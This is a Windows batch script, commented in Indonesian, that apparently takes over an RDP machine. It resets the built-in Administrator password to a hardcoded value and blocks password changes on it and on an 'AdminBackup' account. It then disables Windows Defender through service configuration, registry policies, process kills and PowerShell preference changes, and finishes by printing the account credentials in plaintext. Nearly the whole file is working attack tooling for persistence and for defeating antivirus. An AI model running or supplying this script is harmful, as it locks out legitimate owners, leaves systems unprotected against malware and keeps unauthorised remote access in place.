@echo off
title RDP TOTAL LOCK v3.2 - Password Gaol1 + Backup Locked
color 0A
echo ====================================================
echo     RDP TOTAL LOCK v3.2
echo     Password Utama: Gaol1 + AdminBackup TERKUNCI
echo ====================================================
echo.

echo [INFO] Username: %username% (Built-in Administrator)
echo.

echo PERINGATAN: Script ini SUPER AGRESIF!
pause

echo.
echo [1/6] MENGUBAH PASSWORD AKUN UTAMA jadi Gaol1...
%SystemRoot%\System32\net.exe user "%username%" Gaol1
echo.

echo [2/6] MENGUNCI AKUN UTAMA PERMANEN...
%SystemRoot%\System32\net.exe user "%username%" /passwordchg:no
echo.

echo [3/6] MENGUNCI AKUN BACKUP (AdminBackup) PERMANEN...
%SystemRoot%\System32\net.exe user AdminBackup /passwordchg:no
echo.

echo [4/6] ULTRA DISABLE WINDOWS DEFENDER (14 metode)...
%SystemRoot%\System32\sc.exe config WinDefend start=disabled >nul 2>&1
%SystemRoot%\System32\net.exe stop WinDefend /y >nul 2>&1
%SystemRoot%\System32\sc.exe config Sense start=disabled >nul 2>&1
%SystemRoot%\System32\net.exe stop Sense /y >nul 2>&1
%SystemRoot%\System32\sc.exe config SecurityHealthService start=disabled >nul 2>&1
%SystemRoot%\System32\net.exe stop SecurityHealthService /y >nul 2>&1
%SystemRoot%\System32\sc.exe config wscsvc start=disabled >nul 2>&1
%SystemRoot%\System32\net.exe stop wscsvc /y >nul 2>&1

%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
%SystemRoot%\System32\reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

%SystemRoot%\System32\taskkill.exe /f /im MsMpEng.exe >nul 2>&1
%SystemRoot%\System32\taskkill.exe /f /im MpCmdRun.exe >nul 2>&1
%SystemRoot%\System32\taskkill.exe /f /im SecurityHealthService.exe >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableBlockAtFirstSeen $true" >nul 2>&1
echo.

echo [5/6] EXTRA LOCK PASSWORD VIA REGISTRY...
%SystemRoot%\System32\reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f >nul 2>&1
echo.

echo [6/6] FINALISASI...
echo ====================================================
echo                    HASIL AKHIR
echo ====================================================
echo Username RDP Utama   : Administrator
echo Password RDP Utama   : Gaol1
echo Status               : LOCKED PERMANENT
echo.
echo Akun Backup:
echo Username             : AdminBackup
echo Password             : BackupSayang123!
echo Status               : JUGA TERKUNCI PERMANEN
echo.
echo CATATAN:
echo - Restart komputer sekarang (manual)
echo - Test RDP dengan password GAOL1
echo - Kalau butuh AdminBackup, gunakan password BackupSayang123!
echo.
pause

echo Script selesai. Restart manual ya.
pause
